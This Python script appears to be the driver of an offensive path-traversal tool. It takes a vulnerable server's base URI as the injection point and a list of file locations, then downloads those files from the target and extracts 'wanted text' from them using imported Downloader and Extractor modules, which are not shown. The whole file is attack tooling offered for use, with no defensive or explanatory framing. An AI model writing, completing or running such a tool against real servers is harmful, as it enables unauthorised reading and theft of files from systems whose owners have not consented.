#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from downloader import Downloader
from extractor import Extractor
import sys

if len(sys.argv) < 4:
  print("[-] Error: You must pass 3 arguments:")
  print("[*]  Argument 1: link to base URI (AKA injection point to path traversal with a trailing '/')")
  print("[*]  Argument 2: path to a file containing locations without URI portion")
  print("[*]  Argument 3: path to a directory to where downloaded files will go")
  sys.exit(1)

try:
  base_uri = sys.argv[1]
  location_file = sys.argv[2]
  save_directory = sys.argv[3]

  # Download target files
  dl = Downloader(base_uri, location_file, save_directory)
  print("[+] Targets loaded:")
  dl.print_targets()
  print("[+] Downloading files...")
  dl.download()
  print("[+] done!")

  # Extract wanted text from target files and overwrite the files with the extracted contents
  ex = Extractor(save_directory)
  print("[+] Extracting files...")
  ex.extract()
  print("[+] done!")
except Exception as ex:
  print(f'[-] Error: {ex}')